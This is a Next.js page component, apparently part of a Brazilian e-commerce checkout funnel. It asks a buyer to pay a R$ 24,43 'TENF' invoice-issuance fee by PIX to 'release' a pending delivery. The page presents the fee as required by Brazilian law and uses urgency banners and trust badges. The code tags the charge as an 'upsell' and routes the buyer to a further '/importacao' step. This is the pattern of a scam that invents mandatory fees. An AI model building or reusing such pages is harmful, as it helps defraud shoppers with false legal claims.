"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import PaymentLoadingOverlay from "../../components/PaymentLoadingOverlay";

const O = "#011843";
const OD = "#000d26";
const OL = "#f8efec";
const OM = "#e9dfe0";
const TD = "#201a1b";
const TM = "#71686a";
const TL = "#71686a";
const BG = "#faf8f7";

export default function TenfPage() {
  const router = useRouter();
  const [pulse, setPulse] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => setPulse(true), 800);
    return () => clearTimeout(t);
  }, []);

  const handlePagarTenf = async () => {
    const storedOrderData = sessionStorage.getItem("orderData")
    if (!storedOrderData) {
      alert("Dados do pedido não encontrados. Faça a compra novamente.")
      return
    }

    setIsProcessing(true)

    try {
      const orderData = JSON.parse(storedOrderData)

      const response = await fetch("/api/pix/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          nome: orderData.nome,
          email: orderData.email || "",
          cpf: orderData.cpf,
          valor: 24.43,
          descricao: "Taxa de Emissão de Nota Fiscal (TENF)",
        }),
      })

      const data = await response.json()

      if (!response.ok || !data.success) {
        throw new Error(data.error || "Erro ao criar pagamento PIX")
      }

      const pixPaymentData = {
        transactionId: data.transactionId || null,
        identifier: data.identifier || null,
        copyPaste: data.copyPaste || null,
        qrCodeImage: data.qrCodeImage || null,
        status: data.status || "PENDING",
        acquirerSlug: data.acquirerSlug || "blackpay",
        rawResponse: data.rawResponse || JSON.stringify(data).slice(0, 1000),
      }

      sessionStorage.setItem("pixPaymentData", JSON.stringify(pixPaymentData))
      sessionStorage.setItem("acquirerSlug", data.acquirerSlug || "blackpay")
      sessionStorage.setItem("funnelNext", "/importacao")
      sessionStorage.setItem("paymentContext", JSON.stringify({
        type: "upsell",
        title: "Taxa de Emissão de Nota Fiscal (TENF)",
        value: "R$ 24,43",
        icon: "📋",
      }))
      router.push("/payment")
    } catch (error: any) {
      console.error("[TENF] Erro ao processar pagamento:", error)
      alert(error.message || "Erro ao processar pagamento. Tente novamente.")
      setIsProcessing(false)
    }
  }

  return (
    <div style={{ fontFamily: "'Poppins', sans-serif", backgroundColor: BG, minHeight: "100vh" }}>

      {/* Header */}
      <div style={{ background: `linear-gradient(135deg, ${OD}, ${O})`, padding: "16px 20px" }}>
        <div style={{ maxWidth: "520px", margin: "0 auto", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <a href="/">
            <img src="/images/oILg2cf6VMfI.png" alt="Triunfo Home Design" style={{ height: 32, display: "block" }} />
          </a>
          <div style={{ backgroundColor: "rgba(255,255,255,0.2)", borderRadius: "8px", padding: "6px 12px", textAlign: "right" }}>
            <p style={{ color: "rgba(255,255,255,0.7)", fontSize: "10px", margin: 0 }}>Pedido</p>
            <p style={{ color: "white", fontWeight: 700, fontSize: "13px", margin: 0 }}>#00044792</p>
          </div>
        </div>
      </div>

      {/* Barra de alerta */}
      <div style={{ backgroundColor: "#fef3c7", borderBottom: "1px solid #fbbf24", padding: "10px 20px" }}>
        <p style={{ textAlign: "center", fontSize: "13px", color: "#92400e", margin: 0, fontWeight: 600 }}>
          ⚠️ Ação necessária para liberar sua entrega
        </p>
      </div>

      <div style={{ maxWidth: "520px", margin: "0 auto", padding: "16px" }}>

        {/* Card status do pedido */}
        <div style={{
          backgroundColor: "white",
          borderRadius: "16px",
          boxShadow: "0 2px 16px rgba(0,0,0,0.08)",
          overflow: "hidden",
          marginBottom: "16px",
          border: "1px solid #e5e7eb",
        }}>
          <div style={{ padding: "16px 20px", borderBottom: "1px solid #f3f4f6", display: "flex", alignItems: "center", gap: "12px" }}>
            <div style={{ width: "40px", height: "40px", borderRadius: "50%", backgroundColor: OL, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: "20px" }}>📋</span>
            </div>
            <div>
              <p style={{ fontSize: "13px", fontWeight: 700, color: TD, margin: "0 0 2px" }}>Emissão de Nota Fiscal</p>
              <p style={{ fontSize: "12px", color: TL, margin: 0 }}>Documentação obrigatória por lei</p>
            </div>
            <div style={{ marginLeft: "auto", backgroundColor: "#fef3c7", border: "1px solid #fbbf24", borderRadius: "6px", padding: "4px 10px" }}>
              <p style={{ fontSize: "11px", fontWeight: 700, color: "#92400e", margin: 0 }}>PENDENTE</p>
            </div>
          </div>

          <div style={{ padding: "20px" }}>
            <p style={{ fontSize: "14px", color: TM, lineHeight: "1.7", margin: "0 0 16px" }}>
              Conforme a legislação brasileira, todos os produtos comercializados online
              exigem a <strong style={{ color: TD }}>emissão de documentação fiscal</strong> para garantir a
              legalidade da compra e viabilizar o rastreamento da entrega em todo o território nacional.
            </p>

            {/* Info box */}
            <div style={{
              backgroundColor: OL,
              border: `1px solid ${OM}`,
              borderLeft: `4px solid ${O}`,
              borderRadius: "10px",
              padding: "14px 16px",
              marginBottom: "20px",
            }}>
              <p style={{ fontSize: "13px", color: OD, fontWeight: 600, margin: "0 0 6px" }}>
                📄 O que é a TENF?
              </p>
              <p style={{ fontSize: "13px", color: TM, margin: 0, lineHeight: "1.6" }}>
                A <strong>TENF</strong> (Taxa de Emissão da Nota Fiscal) é o valor cobrado para emitir
                todos os documentos fiscais do seu pedido e habilitar o despacho e rastreamento da entrega.
              </p>
            </div>

            {/* Detalhes */}
            <div style={{ display: "flex", flexDirection: "column", gap: "10px", marginBottom: "20px" }}>
              {[
                { label: "Número do pedido", value: "#00044792" },
                { label: "Status", value: "Aguardando TENF", red: true },
                { label: "Valor da TENF", value: "R$ 24,43", highlight: true },
              ].map((item, i) => (
                <div key={i} style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  padding: "10px 14px",
                  backgroundColor: item.highlight ? OL : BG,
                  borderRadius: "8px",
                  border: item.highlight ? `1px solid ${OM}` : "1px solid #f3f4f6",
                }}>
                  <span style={{ fontSize: "13px", color: TL }}>{item.label}</span>
                  <span style={{
                    fontSize: "14px",
                    fontWeight: 700,
                    color: item.red ? "#dc2626" : item.highlight ? O : TD,
                  }}>
                    {item.value}
                  </span>
                </div>
              ))}
            </div>

            {/* CTA */}
            <button
              onClick={handlePagarTenf}
              disabled={isProcessing}
              style={{
                display: "block",
                width: "100%",
                padding: "16px",
                background: isProcessing ? "#9ca3af" : `linear-gradient(135deg, ${O}, ${OD})`,
                color: "white",
                fontWeight: 700,
                fontSize: "15px",
                borderRadius: "12px",
                border: "none",
                textAlign: "center",
                fontFamily: "'Poppins', sans-serif",
                boxShadow: isProcessing ? "none" : `0 4px 16px rgba(234,88,12,0.4)`,
                animation: pulse && !isProcessing ? "pulse 2s infinite" : "none",
                letterSpacing: "0.5px",
                boxSizing: "border-box",
                cursor: isProcessing ? "not-allowed" : "pointer",
              }}
            >
              💳 REALIZAR PAGAMENTO DA TENF
            </button>

            <p style={{ fontSize: "12px", color: TL, textAlign: "center", margin: "10px 0 0" }}>
              Pagamento único · Processado com segurança
            </p>
          </div>
        </div>

        {/* Trust bar */}
        <div style={{
          backgroundColor: "white",
          borderRadius: "12px",
          border: "1px solid #e5e7eb",
          padding: "14px 20px",
          display: "flex",
          justifyContent: "space-around",
          marginBottom: "16px",
        }}>
          {[
            { icon: "🔒", label: "Pagamento Seguro" },
            { icon: "📄", label: "Nota Fiscal" },
            { icon: "🚚", label: "Entrega Garantida" },
          ].map((item, i) => (
            <div key={i} style={{ textAlign: "center" }}>
              <p style={{ fontSize: "20px", margin: "0 0 4px" }}>{item.icon}</p>
              <p style={{ fontSize: "10px", color: TL, fontWeight: 600, margin: 0 }}>{item.label}</p>
            </div>
          ))}
        </div>

        {/* Rodapé */}
          <p style={{ fontSize: "11px", color: TL, textAlign: "center", lineHeight: "1.6" }}>
            <a href="/termos" style={{ color: TL }}>Termos de Uso</a> · <a href="/privacidade" style={{ color: TL }}>Política de Privacidade</a>
            <br />
            © Triunfo Home Design · Todos os direitos reservados
          </p>
      </div>
      {isProcessing && (
        <PaymentLoadingOverlay
          title="Preparando seu PIX..."
          subtitle="Aguarde enquanto geramos seu código de pagamento"
          isUpsell
        />
      )}
      <style>{`
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.03); }
        }
        @keyframes fadeInUpSmooth {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>
    </div>
  );
}
